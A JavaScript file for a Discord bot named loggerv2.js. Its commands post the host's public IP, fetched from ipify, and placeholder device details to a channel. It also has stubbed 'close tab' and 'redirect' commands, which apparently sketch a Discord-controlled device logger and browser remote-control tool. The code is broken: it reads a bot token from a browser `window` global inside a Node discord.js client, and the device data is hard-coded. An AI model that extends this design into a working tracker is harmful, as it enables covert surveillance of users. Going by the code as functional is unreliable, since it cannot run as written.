// loggerv2.js
const { Client, Intents } = require('discord.js');

const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

// Function to get device information (simulated)
function getDeviceInfo() {
    return {
        userAgent: 'User  Agent Example',
        platform: 'Platform Example',
        language: 'en-US',
    };
}

// Function to get the IP address using a third-party service
async function getIPAddress() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

// Command handling
client.on('messageCreate', async (message) => {
    if (message.author.bot) return; // Ignore bot messages

    const args = message.content.split(' ');
    const command = args[0];

    switch (command) {
        case '/info':
            await sendInfo(message);
            break;
        case '/closetab':
            const tabName = args[1];
            closeTab(tabName, message);
            break;
        case '/redirect':
            const url = args[1];
            redirect(url, message);
            break;
        default:
            message.channel.send('Unknown command');
    }
});

// Function to send info about the current page
async function sendInfo(message) {
    const ipAddress = await getIPAddress();
    const deviceInfo = getDeviceInfo();

    const infoMessage = `
        **Device Information**
        **Website:** ${message.url || 'N/A'}
        **Operating System:** ${deviceInfo.platform}
        **IP Address:** ${ipAddress}
        **User  Agent:** ${deviceInfo.userAgent}
        **Language:** ${deviceInfo.language}
    `;

    message.channel.send(infoMessage);
}

// Function to close a tab (simulated)
function closeTab(tabName, message) {
    message.channel.send(`Closing tab: ${tabName} (simulated, cannot actually close tabs)`);
}

// Function to redirect to a new URL (simulated)
function redirect(url, message) {
    message.channel.send(`Redirecting to: ${url} (simulated, cannot actually redirect)`);
}

// Function to log in using the token stored in memory
function loginWithToken() {
    const token = window.discordBotToken; // Get the token from memory
    if (token) {
        client.login(token).catch(console.error);
    } else {
        console.error('No Discord bot token found.');
    }
}

// Call the login function
loginWithToken();
